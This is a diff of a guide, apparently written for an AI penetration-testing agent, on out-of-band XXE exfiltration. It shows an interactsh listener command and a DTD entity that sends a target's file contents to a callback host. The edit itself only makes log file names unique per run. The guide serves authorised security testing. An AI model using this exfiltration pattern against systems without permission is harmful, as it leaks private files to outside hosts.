@@ -181,9 +181,12 @@ control. This SENDS TARGET DATA to external infrastructure, so only use it when
 the engagement permits an attacker callback; prefer in-band / error-based first.
 OOB needs a callback that CAPTURES the data in the request. Split the two roles:
   - **Capture oracle - interactsh** (`interactsh-client -server oast.fun -json -v
-    > /tmp/oast.log 2>&1 &`): its domain goes INSIDE the DTD's exfil entity
+    > /tmp/oast-RUN.log 2>&1 &`): its domain goes INSIDE the DTD's exfil entity
     (`http://OAST/?x=%file;`); it logs the query string with your data. It does NOT serve
-    the DTD.
+    the DTD. Replace `RUN` with a short random token you pick once for this workflow (for
+    example the output of `openssl rand -hex 4`) and reuse it in every file name: all your
+    chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks
+    as this one's.
   - **The DTD itself** must still be fetched by the target. Either host `oob.dtd` on your
     ONE reachable port (the server LISTENS on your handler port - the pool port, or `4444`
     with a tunnel; the TARGET's URL is the block's `LHOST:LPORT`; same handler-port warning
